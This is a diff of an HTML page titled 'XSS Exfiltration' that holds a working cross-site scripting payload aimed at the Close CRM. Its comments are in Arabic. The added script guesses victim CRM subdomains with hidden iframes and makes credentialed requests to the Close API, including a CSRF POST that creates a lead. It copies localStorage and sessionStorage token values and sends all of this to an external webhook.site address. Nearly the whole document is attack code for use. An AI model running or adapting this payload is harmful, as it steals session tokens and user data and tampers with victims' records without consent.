@@ -1,52 +1,142 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>XSS Exfiltration</title>
 </head>
 <body>
-    <h1>Processing...</h1>
+    <h1>Loading...</h1>
     <script>
-        // دالة عشان نبعت أي حاجة للـ Webhook
+        // ============================================================
+        // (1) الدالة الأساسية: إرسال أي بيانات إلى الـ Webhook
+        // ============================================================
         function send(data) {
             fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?log=' + encodeURIComponent(JSON.stringify(data)));
         }
 
-        // 1. معلومات المتصفح (زي ما جت)
+        // ============================================================
+        // (2) معلومات المتصفح الأساسية (زي ما جت قبل كده)
+        // ============================================================
         send({
             ref: document.referrer || 'None',
             opener: window.opener ? 'Exists' : 'None',
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ua: navigator.userAgent
+            ua: navigator.userAgent,
+            url: window.location.href
         });
 
-        // 2. الهجوم الجديد: حاول تجيب الـ Leads من API Close
-        // ده طلب GET، حتى لو منع الـ CORS قراءة الرد، الطلب هيتنفذ والكوكيز هتروح.
-        // لو الـ API رجع بيانات، هنقدر نقرأها (لو CORS مسموح)، لكن الأغلب هيرجع خطأ CORS.
-        // لكن ده هيثبت إننا نقدر ننفذ طلبات نيابة عن المستخدم.
+        // ============================================================
+        // (3) محاولة تخمين نطاق الـ CRM عن طريق تحميل iframes
+        // ============================================================
+        let domains = [
+            'https://victimorg11.closecrm.com',
+            'https://victim-org11.closecrm.com',
+            'https://app.close.com',
+            'https://victimorg11.close.com',
+            'https://victim-org11.close.com'
+        ];
+
+        domains.forEach(domain => {
+            let iframe = document.createElement('iframe');
+            iframe.src = domain;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            // نسجل المحاولة
+            send({ attempted_domain: domain });
+        });
+
+        // ============================================================
+        // (4) الهجوم الأساسي: استدعاء API الـ Close مباشرة
+        // ============================================================
+        // حاول تجيب الـ Leads من API Close (حتى لو منع CORS، الكوكيز هتروح مع الطلب)
         fetch('https://api.close.com/api/v1/lead/', {
-            credentials: 'include' // عشان يبعت الكوكيز الخاصة بالـ CRM
+            credentials: 'include'  // يرسل كوكيز الجلسة الخاصة بالـ CRM
         })
         .then(r => r.text())
         .then(data => {
-            // لو وصلنا هنا (نادراً)، يبقى الـ CORS مفتوح!
             send({ api_response: data });
         })
         .catch(e => {
-            // لو فشل بسبب CORS، نبعت نوع الخطأ، ده دليل إن الطلب اتبعت على الأقل.
+            // لو فشل بسبب CORS، الطلب نفسه اتبعت على الأقل
             send({ api_error: e.message });
         });
 
-        // 3. جرب تطلب صفحة الـ Dashboard بتاعة الـ CRM (عشان نجيب اسم النطاق)
-        // الفكرة: نحاول نجيب أي ملف من النطاق الرئيسي.
+        // ============================================================
+        // (5) محاولة قراءة الصفحة الرئيسية (Dashboard) من نفس النطاق
+        // ============================================================
         fetch('/', { credentials: 'include' })
         .then(r => r.text())
         .then(html => {
-            // لو نجح، نبعت أول 100 حرف من الصفحة (قد تحتوي على اسم المنظمة أو التوكنات)
-            send({ homepage_preview: html.substring(0, 200) });
+            send({ homepage_preview: html.substring(0, 300) });
         })
         .catch(e => {
             send({ homepage_error: e.message });
         });
+
+        // ============================================================
+        // (6) تجربة CSRF: محاولة إضافة "ملاحظة" في الـ CRM (تغيير بيانات)
+        // ============================================================
+        // ده مثال على طلب POST (لو الـ API مش محمي ضد CSRF)
+        // هجرب نضيف ملاحظة باسم "XSS-TEST" عشان نثبت إننا نقدر نعدل بيانات.
+        fetch('https://api.close.com/api/v1/lead/', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                display_name: 'XSS-TEST-LEAD',
+                organization: 'victim_org11'
+            })
+        })
+        .then(r => r.text())
+        .then(data => {
+            send({ csrf_post_response: data });
+        })
+        .catch(e => {
+            send({ csrf_post_error: e.message });
+        });
+
+        // ============================================================
+        // (7) محاولة سرقة التوكنات من الـ LocalStorage (لو موجودة)
+        // ============================================================
+        let storage = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+        } catch (e) {
+            storage = { error: e.message };
+        }
+        send({ localStorage: storage });
+
+        // ============================================================
+        // (8) محاولة سرقة التوكنات من الـ SessionStorage
+        // ============================================================
+        let session = {};
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                session[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) {
+            session = { error: e.message };
+        }
+        send({ sessionStorage: session });
+
+        // ============================================================
+        // (9) محاولة تحميل صورة من النطاق الداخلي (لتأكيد النطاق)
+        // ============================================================
+        // هجرب نحمل صورة من نطاق الـ CRM نفسه (لو وجد) عشان نعرف النطاق الحقيقي
+        let img = new Image();
+        img.src = '/favicon.ico';  // ملف موجود في معظم المواقع
+        img.onerror = function() {
+            send({ favicon_error: 'Failed to load favicon from root' });
+        };
+        img.onload = function() {
+            send({ favicon_success: 'Favicon loaded successfully from root' });
+        };
+        document.body.appendChild(img);
     </script>
 </body>
 </html>
